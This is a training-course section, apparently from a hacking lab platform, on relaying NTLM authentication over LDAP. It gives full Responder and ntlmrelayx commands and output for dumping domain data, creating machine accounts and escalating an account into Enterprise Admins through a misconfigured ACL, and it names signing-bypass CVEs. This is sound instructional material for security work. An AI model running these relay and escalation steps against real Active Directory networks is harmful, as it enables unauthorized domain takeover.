## NTLM Relay over LDAP

The `Lightweight Directory Access Protocol` ( `LDAP`), is a widely used protocol for accessing and managing distributed directory information services. LDAP is a standardized protocol that various directory service providers can implement and is typically used for authentication and querying directory data in a cross-platform manner. In Windows environments, LDAP plays a crucial role in authentication, user and group management, and various other directory-related tasks. LDAP is primarily used to access and manage directory services, mainly focusing on querying, maintaining, and authenticating access to Active Directory. To know more about `LDAP`, refer to the [Active Directory LDAP](https://academy.hackthebox.com/module/details/22) module.

There are several `cross-protocol` post-relay attacks when relaying `NTLM` authentication over `LDAP`; the ones this section covers are:
- `Domain Enumeration`
- `Computer Accounts Creation`
- `Privilege Escalation via ACLs Abuse`

Additionally, in the `Advanced NTLM Relay Attacks Targeting Kerberos` section, we will cover `Kerberos RBCD Abuse` and `Password Attacks`.

---

### Domain Enumeration

We can dump the LDAP information on the DC if we relay a domain user’s `NTLM` authentication to the DC and establish an authenticated session. By default, when we use the `ldap://` scheme, `ntlmrelayx` will try to dump domain information, add a new domain admin, and escalate privileges via misconfigured `ACLs`/ `DACLs` attacks. However, we can deactivate any of these attacks using specific options: `--no-da` disables adding a domain admin while `--no-acl` prevents abusing misconfigured `ACLs`. The `--lootdir`/ `-l` option allows specifying a directory where `ntlmrelayx` will dump the LDAP domain information.

Let’s start `Responder` after setting its `SMB` and `HTTP` servers to `Off`:

```
htb-student@ubuntu:~$ sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder/Responder.conf
htb-student@ubuntu:~$ cat Responder.conf | grep -ie "SMB =\|HTTP ="
SMB = Off
HTTP = Off
```

```
htb-student@ubuntu:~$ sudo python3 Responder/Responder.py -I ens192

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  <SNIP>
```

We can now start `ntlmrelayx` and target the `LDAP` protocol and the Domain Controller (which is the server that commonly hosts the `LDAP` service in the Active Directory network):

```
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections

[*] SMBD-Thread-5: Received connection from 172.16.117.60, attacking target ldap://172.16.117.3
[!] The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP)
```

Notice that after waiting for a while, we may get an error saying:

`The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP)`.

From previous sections, we know that by default, domain controllers always require `session signing`, therefore, when we try to relay `SMB NTLM` authentication over `LDAP` on the DC, it will fail, as the DC will request the client to perform `session signing`. However, we also learned that there are exploits that bypass `session signing` requirements, specifically, `Drop the MIC` ( `CVE-2019-1040`), `Drop the MIC 2` ( `CVE-2019-1166`) and `Your Session Key is my Session Key` ( `CVE-2019-1019`). `ntlmrelayx` provides the options `--remove-mic` and `-remove-target` for use against relay targets vulnerable to `CVE-2019-1040` and `CVE-2019-1019`, respectively.

We can use [CVE-2019-1040 Scanner](https://github.com/fox-it/cve-2019-1040-scanner/tree/master) to check whether a relay target is vulnerable to `CVE-2019-1040`, and if it is, we can utilize `ntlmrelayx`’s `--remove-mic` option; however, in our target network the DC is patched (the tool requires a valid domain account, and we will know how to attain one in the next attack):

```
python3 scan.py inlanefreight/plaintext$:'o6@ekk5/#rlw2rAe'@172.16.117.3

[*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth
[*] Target 172.16.117.3 is not vulnerable to CVE-2019-1040 (authentication was rejected)
```

Nevertheless, if we keep `ntlmrelayx` (and `Responder`) running, we will eventually receive `HTTP NTLM` authentication. `HTTP NTLM` authentication can be relayed over `LDAP` since `HTTP` does not support `session signing` and therefore, the DC does not/cannot request it. `ntlmrelayx` will relay the `HTTP NTLM` authentication over `LDAP` on the DC (which is another type of `cross-protocol relay`) and dump the domain information, saving it in the directory “ldap_dump”:

```
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump

<SNIP>
[*] HTTPD(80): Connection from 172.16.117.60 controlled, attacking target ldap://172.16.117.3
[*] HTTPD(80): Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/PETER SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```

Once `ntlmrelayx` finishes dumping the domain information, we can then analyze the data gathered to move forward in our engagements:

```
ls ldap_dump/

domain_computers_by_os.html  domain_computers.html  domain_groups.grep  domain_groups.json  domain_policy.html  domain_trusts.grep  domain_trusts.json          domain_users.grep  domain_users.json
domain_computers.grep        domain_computers.json  domain_groups.html  domain_policy.grep  domain_policy.json  domain_trusts.html  domain_users_by_group.html  domain_users.html
```

---

### Computer Accounts Creation

In Active Directory, a computer/machine account is an object similar to a domain user account but with additional properties. Computer accounts allow querying the domain and performing actions, similar to user accounts; it is possible to create a computer account in AD environments where the domain-level attribute `ms-DS-MachineAccountQuota` is set to 1 or more (by default, it is set to 10), and where the computer account creation right has not been modified for regular domain users.

If we relay the `NTLM` authentication of a domain user over to the DC and establish an authenticated session, we can use `ntlmrelayx`’s `--add-computer` option to create computer accounts; this option takes two optional arguments, computer name and password, for example, `--add-computer 'NAME' 'PASSWORD'`. If we omit any of the two optional arguments, `ntlmrelayx` will provide randomly generated values. We will keep the `SMB` and `HTTP` servers of `Responder` `Off` and run `ntlmrelayx` to create the computer account `plaintext$` with a randomly generated password:

```
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
<SNIP>

[*] Servers started, waiting for connections
[*] HTTPD(80): Connection from 172.16.117.60 controlled, attacking target ldap://172.16.117.3
[*] HTTPD(80): Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/PETER SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Adding a machine account to the domain requires TLS, but ldap:// scheme provided. Switching target to LDAPS via StartTLS
[*] Attempting to create computer in: CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] Adding new computer with username: plaintext$ and password: o6@ekK5#rlw2rAe result: OK
```

When reading the output of `ntlmrelayx`, we will notice that it states:

” `[*] Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS`“.

`LDAPS` is required for adding machine accounts; however, the scheme we provided is `ldap://`. In older versions of `ntlmrelayx`, this attack would fail; however, after the [Implementing StartTLS](https://github.com/fortra/impacket/pull/1305) PR, `ntlmrelayx` bypasses `LDAP Channel Binding` via the `StartTLS` mechanism; the blog post [Bypassing LDAP Channel Binding with StartTLS](https://offsec.almond.consulting/bypassing-ldap-channel-binding-with-starttls.html) describes this bypass technique in great detail.

The output also includes the information about the new computer with username `plaintext$` and password `o6@ekK5#rlw2rAe`; having a computer account is useful if we don’t have any domain user. For example, in the following sections, we will perform authentication coercion that will allow us to conduct more advanced attacks and move laterally and horizontally across the domain.

---

### Privileges Escalation via ACLs Abuse

Another attack we could perform over `LDAP` is to escalate the privileges of a user; however, this is only possible if the relayed account has high-privilege permissions in the domain (i.e., add an account to a high-privilege group such as the Domain Admins group or edit the domain object’s DACL). In that case, we can use `ntlmrelayx`’s `--escalate-user` option followed by the computer account we created, `plaintext$`, or any other account we control, to attempt privilege escalation attacks via abusing misconfigured `ACLs/DACLs`. The `-debug` option makes ntlmrelayx verbose by showing debug information:

```
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug

Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>

[*] Servers started, waiting for connections
[*] HTTPD(80): Connection from 172.16.117.60 controlled, attacking target ldap://172.16.117.3
[*] HTTPD(80): Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/NPORTS SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[+] User is a member of: [DN: CN=SQL Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL - STATUS: Read - READ TIME: 2023-07-24T20:23:28.703082
    name: SQL Admins
    objectSid: S-1-5-21-1207890233-375443991-2397730614-1153
]
[+] User is a member of: [DN: CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL - STATUS: Read - READ TIME: 2023-07-24T20:23:28.706705
    distinguishedName: CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
    name: Domain Users
    objectSid: S-1-5-21-1207890233-375443991-2397730614-513
]
[+] Permission found: Full Control on CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL; Reason: GENERIC_ALL via CN=SQL Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[+] Performing Group attack
[*] Adding user: plaintext to group Enterprise Admins result: OK
[*] Privilege escalation successful, shutting down...
```

In the above example, `ntlmrelayx` relayed the `HTTP NTLM` authentication of the user `INLANEFREIGHT/NPORTS` over `LDAP` to the DC and enumerated the user’s privileges; `NPORTS` is a member of the `SQL Admins` group, which has `Full Control` over the `Enterprise Admins` group, therefore, `ntlmrelayx` added the account `plaintext$` to the highly privileged `Enterprise Group`. (Refer to the [DACL Attacks I](https://academy.hackthebox.com/module/details/219) module to know more about attacking misconfigured AD `ACLs/DACLs`.)